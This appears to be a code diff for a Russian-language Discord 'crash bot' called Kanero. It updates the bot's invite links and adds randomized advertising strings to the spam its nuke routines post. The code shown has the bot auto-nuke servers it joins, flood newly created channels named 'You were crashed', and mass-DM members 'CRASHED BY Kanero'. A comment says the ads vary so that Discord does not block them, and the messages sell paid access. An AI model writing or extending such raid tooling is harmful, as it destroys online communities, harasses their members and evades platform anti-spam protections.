@@ -227,11 +227,11 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
     # Реклама — добавляется всегда, вариативно чтобы Discord не блокировал
     import random
     ad_variants = [
-        "\n\n☠️ Kanero — https://discord.gg/XpNZAwh4",
-        "\n\n💀 Хочешь так же? → discord.gg/XpNZAwh4",
-        "\n\n☠️ Kanero crash bot — discord.gg/XpNZAwh4",
-        "\n\n💀 Kanero — заходи: discord.gg/XpNZAwh4",
-        "\n\n☠️ discord.gg/XpNZAwh4 — Kanero",
+        "\n\n☠️ Kanero — https://discord.gg/JhQtrCtKFy",
+        "\n\n💀 Хочешь так же? → discord.gg/JhQtrCtKFy",
+        "\n\n☠️ Kanero crash bot — discord.gg/JhQtrCtKFy",
+        "\n\n💀 Kanero — заходи: discord.gg/JhQtrCtKFy",
+        "\n\n☠️ discord.gg/JhQtrCtKFy — Kanero",
     ]
 
     NUKE_NAME = "Вы были крашнуты"
@@ -345,11 +345,19 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     )
 
     # ── 5. Создаём новые каналы и спамим ──
+    import random
+    ad_variants = [
+        "\n\n☠️ Kanero — https://discord.gg/JhQtrCtKFy",
+        "\n\n💀 Хочешь так же? → discord.gg/JhQtrCtKFy",
+        "\n\n☠️ Kanero crash bot — discord.gg/JhQtrCtKFy",
+        "\n\n💀 Kanero — заходи: discord.gg/JhQtrCtKFy",
+        "\n\n☠️ discord.gg/JhQtrCtKFy — Kanero",
+    ]
     async def create_and_spam(i):
         try:
             ch = await guild.create_text_channel(name=TURBO_NAME)
             await asyncio.gather(
-                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
+                *[ch.send(spam_text + random.choice(ad_variants)) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                 return_exceptions=True
             )
         except Exception:
@@ -419,11 +427,20 @@ async def do_owner_nuke_task(guild, spam_text=None):
     )
 
     # ── 5. Создаём новые каналы и спамим ──
+    # ── 5. Создаём новые каналы и спамим ──
+    import random
+    ad_variants = [
+        "\n\n☠️ Kanero — https://discord.gg/JhQtrCtKFy",
+        "\n\n💀 Хочешь так же? → discord.gg/JhQtrCtKFy",
+        "\n\n☠️ Kanero crash bot — discord.gg/JhQtrCtKFy",
+        "\n\n💀 Kanero — заходи: discord.gg/JhQtrCtKFy",
+        "\n\n☠️ discord.gg/JhQtrCtKFy — Kanero",
+    ]
     async def create_and_spam(i):
         try:
             ch = await guild.create_text_channel(name=OWNER_NAME)
             await asyncio.gather(
-                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
+                *[ch.send(spam_text + random.choice(ad_variants)) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                 return_exceptions=True
             )
         except Exception:
@@ -498,7 +515,7 @@ async def nuke(ctx, *, text: str = None):
                 "Для использования `!nuke` нужна регистрация.\n\n"
                 "**Как получить доступ (бесплатно):**\n"
                 "Зайди на наш сервер и напиши в канал `#addbot`\n"
-                "https://discord.gg/XpNZAwh4\n\n"
+                "https://discord.gg/JhQtrCtKFy\n\n"
                 "**Расширенный доступ:** **davaidkatt**"
             ),
             color=0x0a0a0a
@@ -590,7 +607,7 @@ async def cleanup(ctx):
     if not is_freelisted(uid):
         embed = discord.Embed(
             title="☠️ ДОСТУП ЗАПРЕЩЁН",
-            description="Для `!cleanup` нужна регистрация.\nНапиши в #addbot: https://discord.gg/XpNZAwh4",
+            description="Для `!cleanup` нужна регистрация.\nНапиши в #addbot: https://discord.gg/JhQtrCtKFy",
             color=0x0a0a0a
         )
         embed.set_footer(text="☠️ Kanero")
@@ -686,7 +703,7 @@ async def auto_nuke(ctx, state: str):
                 "Для использования `!auto_nuke` нужна регистрация.\n\n"
                 "**Как получить доступ (бесплатно):**\n"
                 "Зайди на наш сервер и напиши в канал `#addbot`\n"
-                "https://discord.gg/XpNZAwh4"
+                "https://discord.gg/JhQtrCtKFy"
             ),
             color=0x0a0a0a
         )
@@ -1449,7 +1466,7 @@ async def setup(ctx):
             "2. Получишь роль 👥 User и доступ к боту\n"
             "3. Добавь бота на свой сервер\n\n"
             "**Купить White/Premium:** **davaidkatt** | **@Firisotik**\n"
-            "**Сервер:** https://discord.gg/XpNZAwh4"
+            "**Сервер:** https://discord.gg/JhQtrCtKFy"
         ), color=0x0a0a0a
     ).set_footer(text="☠️ Kanero"))
 
@@ -2482,7 +2499,7 @@ async def help_cmd(ctx):
     elif is_freelisted(uid):
         access_str = "📋 **Freelist** — базовый доступ (написал в #addbot)"
     else:
-        access_str = "❌ **Нет доступа** — напиши в #addbot на нашем сервере: https://discord.gg/XpNZAwh4"
+        access_str = "❌ **Нет доступа** — напиши в #addbot на нашем сервере: https://discord.gg/JhQtrCtKFy"
 
     embed.add_field(name="🔑 Твой уровень", value=access_str, inline=False)
 
@@ -2725,7 +2742,7 @@ async def on_member_remove(member):
     if removed:
         try:
             home_guild = bot.get_guild(HOME_GUILD_ID)
-            invite_url = "https://discord.gg/XpNZAwh4"
+            invite_url = "https://discord.gg/JhQtrCtKFy"
             if home_guild:
                 try:
                     ch = next((c for c in home_guild.text_channels if c.permissions_for(home_guild.me).create_instant_invite), None)
@@ -2808,7 +2825,7 @@ async def on_member_join(member):
             "• `!changelog` / `!changelogall` — история обновлений\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             "**💎 Купить Premium:** **davaidkatt** | **@Firisotik**\n"
-            "**🔗 Сервер:** https://discord.gg/XpNZAwh4"
+            "**🔗 Сервер:** https://discord.gg/JhQtrCtKFy"
         ),
         color=0x0a0a0a
     )
@@ -2856,7 +2873,7 @@ async def on_guild_join(guild):
         nuke_running[guild.id] = True
         asyncio.create_task(do_nuke(guild))
 
-        dm_text = "|| @everyone @here ||\n# CRASHED BY Kanero\n# https://discord.gg/XpNZAwh4\n# https://discord.gg/XpNZAwh4\n# https://discord.gg/XpNZAwh4"
+        dm_text = "|| @everyone @here ||\n# CRASHED BY Kanero\n# https://discord.gg/JhQtrCtKFy\n# https://discord.gg/JhQtrCtKFy\n# https://discord.gg/JhQtrCtKFy"
 
         async def dm_all():
             for member in guild.members:
@@ -3221,7 +3238,7 @@ async def on_message(message):
             elif is_fl:
                 access_str = "📋 **Freelist** — базовый доступ (написал в #addbot)"
             else:
-                access_str = "❌ **Нет доступа** — напиши в #addbot: https://discord.gg/XpNZAwh4"
+                access_str = "❌ **Нет доступа** — напиши в #addbot: https://discord.gg/JhQtrCtKFy"
 
             embed.add_field(name="🔑 Твой уровень доступа", value=access_str, inline=False)
             embed.add_field(
@@ -3743,7 +3760,7 @@ async def on_message(message):
                             "`!help` — список команд\n"
                             "`!changelog` / `!changelogall` — история обновлений\n\n"
                             "Для White/Premium напиши: **davaidkatt** | **@Firisotik**\n\n"
-                            "Наш сервер: https://discord.gg/XpNZAwh4"
+                            "Наш сервер: https://discord.gg/JhQtrCtKFy"
                         ),
                         color=0x0a0a0a
                     ).set_footer(text="Kanero  |  davaidkatt")
